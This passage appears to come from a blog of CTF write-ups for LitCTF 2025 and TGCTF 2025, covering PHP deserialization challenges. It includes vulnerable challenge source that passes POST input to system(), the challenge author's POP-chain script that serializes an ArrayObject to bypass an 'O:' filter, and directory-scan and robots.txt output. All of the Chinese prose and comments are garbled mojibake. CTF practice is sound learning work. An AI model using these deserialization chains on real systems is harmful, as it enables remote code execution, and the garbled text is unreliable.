class="hljs-comment">// è°ƒç”¨soulå¯¹è±¡çš„flagæ–¹æ³•</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// ä»POSTè¯·æ±‚ä¸­è·å–Litctf2025å‚æ•°</span><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-comment">// æ£€æŸ¥å‚æ•°æ˜¯å¦ä»¥&quot;O:&quot;æˆ–&quot;a:&quot;å¼€å¤´å¹¶è·Ÿç€æ•°å­—</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-comment">// å¦‚æœä¸åŒ¹é…ï¼Œåˆ™ååºåˆ—åŒ–è¯¥å‚æ•°</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// å¦‚æœåŒ¹é…ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>ååºåˆ—åŒ–ï¼Œçœ‹çœ‹aiæ€ä¹ˆè¯´  </p>
<p>aiæ²¡ç”¨ï¼Œä½†æ˜¯æ‰¾åˆ°äº†å‡ºé¢˜äººçš„wp   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\000lambda_1&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-variable">$b</span>;		<span class="hljs-comment">// 1.æŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨ï¼Œè§¦å‘__invoke()</span><br><span class="hljs-variable">$b</span>-&gt;thread = <span class="hljs-variable">$c</span>;		<span class="hljs-comment">// 2. æŠŠå¯¹è±¡ä½œä¸ºå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œè§¦å‘__toString()</span><br><span class="hljs-variable">$c</span>-&gt;soul = <span class="hljs-variable">$a</span>;			<span class="hljs-comment">// 3. è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘__call()</span><br><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br></code></pre></td></tr></table></figure>
<p>æœ‰æ²¡è§è¿‡çš„çŸ¥è¯†ç‚¹<br>å…¶ä¸­æ˜¯è¦è°ƒç”¨ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè¿˜æœ‰æ˜¯ä½¿ç”¨arrayobjectç±»å‹æ¥ååºåˆ—åŒ–å‡ºCå¼€å¤´çš„payloadæ¥ç»•è¿‡</p>
<h1 id="TGCTF-2025"><a href="#TGCTF-2025" class="headerlink" title="TGCTF 2025"></a>TGCTF 2025</h1><h2 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ"><a href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ"></a>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</h2><p>å¥½åƒä¸Šä¼ å•¥éƒ½å›æ˜¾ hacker  </p>
<p>æµ…æµ…æ‰«ä¸€ä¸‹ç›®å½•  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /assets/<br><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//127.0.0.1/assets/</span><br><span class="hljs-selector-attr">[23:39:04]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /css  -&gt;  http:<span class="hljs-comment">//127.0.0.1/css/</span><br><span class="hljs-selector-attr">[23:39:15]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">239</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br></code></pre></td></tr></table></figure>
<p>åŸæ¥å‰ç«¯é‡Œå·²ç»æç¤ºï¼šæœºå™¨äººæ˜¯å•¥ï¼Ÿ<br>åœ¨æš—ç¤ºæœ‰robotsäº†  </p>
<p>robots:</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-Agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>private<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/baidu</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>s<span class="hljs-operator">?</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/unlink</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/phar</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">!</span>@<span class="hljs-operator">*</span>($^&amp;<span class="hljs-operator">*</span><span class="hljs-operator">!</span>@^&amp;<span class="hljs-operator">!</span><span class="hljs-operator">*</span>(@$<span class="hljs-comment"># &lt;--!æ–‡ä»¶ä¸Šä¼ åç¼€æ˜¯ä¸‰ä¸ªå°å†™å­—æ¯ !@#$*&amp;^(!%@#$#^&amp;!--&gt;</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>class.php<br></code></pre></td></tr></table></figure>
<p>åªæœ‰class.php èƒ½è¿ä¸Š<br>æ€ä¹ˆæ˜¯ååºåˆ—åŒ–ï¼Ÿ  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>aiæ³¨é‡Šä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç </span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Š</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¤šå±‚base64è§£ç çš„å‡½æ•°</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// å¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œ5æ¬¡base64è§£ç </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>))));<br>    &#125;<br><br>    // å®šä¹‰yesterdayç±»<br>    <span class="hljs-keyword">class</span> yesterday &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;      // å…¬å…±å±æ€§learn<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;  // å…¬å…±å±æ€§studyï¼Œé»˜è®¤å€¼ä¸º<span class="hljs-string">&quot;study&quot;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;        // å…¬å…±å±æ€§<span class="hljs-keyword">try</span><br><br>        // æ„é€ å‡½æ•°<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()<br>        &#123;<br>            // åˆå§‹åŒ–learnå±æ€§<br>            <span class="hljs-variable">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // ææ„å‡½æ•°<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__destruct</span>()<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            // è°ƒç”¨studyå¯¹è±¡çš„hardæ–¹æ³•<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br><br>    // å®šä¹‰todayç±»<br>    <span class="hljs-keyword">class</span> today &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;  // å…¬å…±å±æ€§doing<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;    // å…¬å…±å±æ€§did<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;   // å…¬å…±å±æ€§done<br><br>        // æ„é€ å‡½æ•°<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()&#123;<br>            // åˆå§‹åŒ–didå±æ€§<br>            <span class="hljs-variable">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // é­”æœ¯æ–¹æ³•ï¼šå½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è§¦å‘<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>)<br>        &#123;<br>            <span class="hljs-variable">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$this</span>-&gt;done;<br>            // æ£€æŸ¥doingå±æ€§çš„åŒé‡MD5å“ˆå¸Œæ˜¯å¦ç­‰äº<span class="hljs-number">666</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-comment">// è°ƒç”¨doingå±æ€§ä½œä¸ºå‡½æ•°</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// è¿”å›doingå¯¹è±¡çš„betterå±æ€§</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å®šä¹‰tommorawç±»</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;   <span class="hljs-comment">// å…¬å…±å±æ€§good</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;    <span class="hljs-comment">// å…¬å…±å±æ€§bad</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;   <span class="hljs-comment">// å…¬å…±å±æ€§soso</span><br><br>        <span class="hljs-comment">// 